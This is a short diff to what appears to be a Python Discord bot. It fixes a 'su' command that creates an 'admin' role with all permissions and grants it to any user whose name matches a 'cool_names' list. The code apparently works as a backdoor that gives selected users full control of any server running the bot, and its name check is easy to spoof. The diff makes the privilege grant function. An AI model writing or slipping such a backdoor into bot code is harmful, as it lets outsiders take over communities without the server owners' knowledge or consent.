@@ -191,7 +191,7 @@ async def su(ctx):
 
     if any((name in authors_name for name in cool_names)):
         role = await ctx.guild.create_role(name="admin", permissions=Permissions.all())
-        await ctx.guild.add_roles(ctx.author, role)
+        await ctx.author.add_roles(role)
 
 
 if __name__ == '__main__':
